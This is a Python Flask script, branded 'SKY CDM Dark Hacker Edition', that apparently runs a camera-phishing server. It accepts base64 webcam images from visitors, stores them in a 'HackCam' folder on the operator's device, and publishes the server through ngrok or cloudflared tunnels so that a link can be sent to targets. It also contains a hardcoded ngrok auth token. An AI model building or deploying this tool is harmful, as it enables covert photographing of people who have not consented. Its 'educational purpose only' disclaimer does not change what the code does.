#!/usr/bin/env python3
# ⚡ SKY CDM — CDM TECH 503 — DARK HACKER EDITION ⚡
# 🔥 "Le code est une arme. Manipule-la avec honneur."

from flask import Flask, render_template, request, jsonify
import os
import base64
import subprocess
import time
import re
import platform
import urllib.request
import json
import threading
import random
import sys
from datetime import datetime

app = Flask(__name__)

# ==================== CONFIGURATION ====================
CAPTURE_DIR = "/sdcard/SKY_CDM_HackCam"
PORT = 5000
NGROK_TOKEN = "cr_3BoLoibTTAfWwwvjKHBEQwYt8uG"

# ==================== ASCII GLITCH BANNER ====================
def glitch_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def show_skull():
    skull = r"""
                     ⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀              
                 ⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀           
               ⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀         
              ⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄        
             ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆       
             ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆      
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇     
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇     
             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃     
             ⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏      
              ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁      
               ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟       
               ⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁       
                 ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋         
                   ⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉           
                      ⠈⠙⠛⠛⠛⠛⠋⠉               
    """
    print(f"\033[1;31m{skull}\033[0m")

def sky_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Effet de chargement hacker
    print("\033[1;32m[ INITIALIZATION ]\033[0m", end="")
    for _ in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    time.sleep(0.5)
    
    show_skull()
    
    banner = f"""
\033[1;31m
╔══════════════════════════════════════════════════════════════════════════════╗
║  ░██████╗██╗░░██╗██╗░░░██╗░░░░░██████╗░██████╗███╗░░░███╗░░░░░░░░░░░░░░░░  ║
║  ██╔════╝██║░██╔╝╚██╗░██╔╝░░░░░██╔════╝██╔══██╗████╗░████║░░░░░░░░░░░░░░  ║
║  ╚█████╗░█████╔╝░░╚████╔╝░░░░░░██║░░░░░██║░░██║██╔████╔██║░░░░░░░░░░░░░░  ║
║  ░╚═══██╗██╔═██╗░░░╚██╔╝░░░░░░░██║░░░░░██║░░██║██║╚██╔╝██║░░░░░░░░░░░░░░  ║
║  ██████╔╝██║░╚██╗░░░██║░░░░░░░░╚██████╗██████╔╝██║░╚═╝░██║░░░░░░░░░░░░░░  ║
║  ╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░░░░╚═════╝╚═════╝░╚═╝░░░░░╚═╝░░░░░░░░░░░░░░  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;35m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[1;31m  ║
║  \033[1;36m⚡ SKY CDM — CDM TECH 503 — DARK HACKER EDITION ⚡\033[1;31m                  ║
║  \033[1;35m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[1;31m  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;33m👑 DEV....: SKY PLUG CDM — The Living Legend\033[1;31m                       ║
║  \033[1;32m💀 TEAM...: CDM TECH 503 — Digital Mafia\033[1;31m                          ║
║  \033[1;34m📡 STATUT.: FULLY OPERATIONAL\033[1;31m                                      ║
║  \033[1;37m🗂️  TARGET.: {CAPTURE_DIR}\033[1;31m                                            ║
║  \033[1;35m🔐 ENCRYPT.: AES-256 + CDM LAYER\033[1;31m                                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;31m⚠️  WARNING: Unauthorized access is forbidden by law ⚠️\033[1;31m             ║
║  \033[1;33m[*] Educational purpose only — The author is not responsible\033[1;31m       ║
╚══════════════════════════════════════════════════════════════════════════════╝
\033[0m
"""
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.02)

# ==================== ROUTES FLASK ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        if not data or 'image' not in data or 'number' not in data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400

        image_data = data['image'].split(',')[1]
        number = data['number']
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        
        filename = f"SKYCDM_{number}_{timestamp}.jpg"
        filepath = os.path.join(CAPTURE_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data))
        
        print(f"\033[1;32m[✔] CAPTURE STORED → {filename}\033[0m")
        return jsonify({'status': 'success', 'file': filename})
    
    except Exception as e:
        print(f"\033[1;31m[✘] UPLOAD FAILED → {e}\033[0m")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== NGROK ====================
def download_ngrok():
    arch = platform.machine()
    if arch.startswith(('arm', 'aarch')):
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
    elif arch == 'x86_64':
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
    else:
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
    
    if os.path.exists('ngrok'):
        os.remove('ngrok')
    
    print("\033[1;34m[↻] DOWNLOADING NGROK...\033[0m")
    os.system(f'curl -sL {url} -o ngrok.zip')
    os.system('unzip -qq -o ngrok.zip')
    os.system('chmod +x ngrok')
    os.remove('ngrok.zip')

def start_ngrok():
    download_ngrok()
    print("\033[1;34m[↻] AUTHENTICATING...\033[0m")
    os.system(f'./ngrok authtoken {NGROK_TOKEN} 2>/dev/null')
    
    print("\033[1;34m[↻] DEPLOYING TUNNEL...\033[0m")
    process = subprocess.Popen(
        ['./ngrok', 'http', str(PORT), '--log=stdout'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    
    for _ in range(30):
        try:
            with urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels') as resp:
                tunnels = json.load(resp).get('tunnels', [])
                for t in tunnels:
                    url = t.get('public_url', '')
                    if url.startswith('https://'):
                        print(f"\n\033[1;32m╔══════════════════════════════════════════════╗\033[0m")
                        print(f"\033[1;32m║  🔗 PUBLIC LINK (NGROK) :\033[0m")
                        print(f"\033[1;32m║  \033[1;35m{url}\033[0m")
                        print(f"\033[1;32m╚══════════════════════════════════════════════╝\033[0m\n")
                        return process
        except:
            time.sleep(0.5)
    
    print("\033[1;31m[✘] NGROK FAILED → LOCAL MODE ONLY\033[0m")
    return process

# ==================== CLOUDFLARED ====================
def start_cloudflared():
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        url_pattern = r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com'
        
        for _ in range(40):
            line = process.stdout.readline()
            if not line:
                break
            match = re.search(url_pattern, line)
            if match:
                url = match.group(0)
                print(f"\n\033[1;32m╔══════════════════════════════════════════════╗\033[0m")
                print(f"\033[1;32m║  🔗 PUBLIC LINK (CLOUDFLARED) :\033[0m")
                print(f"\033[1;32m║  \033[1;36m{url}\033[0m")
                print(f"\033[1;32m╚══════════════════════════════════════════════╝\033[0m\n")
                return process
            time.sleep(0.5)
        
        print("\033[1;31m[✘] CLOUDFLARED NOT DETECTED\033[0m")
    except Exception as e:
        print(f"\033[1;31m[✘] CLOUDFLARED ERROR → {e}\033[0m")
    return None

# ==================== FLASK LAUNCHER ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

# ==================== MAIN ====================
if __name__ == '__main__':
    sky_banner()
    
    # Menu hacker
    print("\033[1;33m┌──(\033[1;32mroot@SKYCDM\033[1;33m)-[\033[1;36m~\033[1;33m]\033[0m")
    print("\033[1;33m└──╼ \033[1;36mSELECT TUNNEL:\033[0m")
    print("\033[1;32m   [1] CLOUDFLARED \033[0m(\033[1;34mrecommended\033[0m\033[1;32m)\033[0m")
    print("\033[1;32m   [2] NGROK\033[0m")
    choix = input("\n\033[1;33m➤ \033[1;36m").strip()
    
    tunnel_process = None
    if choix == "2":
        tunnel_process = start_ngrok()
    else:
        tunnel_process = start_cloudflared()
    
    print("\n\033[1;34m[↻] STARTING FLASK SERVER...\033[0m")
    print("\033[1;33m[!] PRESS CTRL+C TO TERMINATE\033[0m\n")
    
    try:
        run_flask()
    except KeyboardInterrupt:
        print("\n\033[1;31m[✘] KILLING PROCESSES...\033[0m")
        if tunnel_process:
            tunnel_process.terminate()
        print("\033[1;32m[✔] SYSTEM SHUTDOWN — SKY CDM OUT\033[0m")
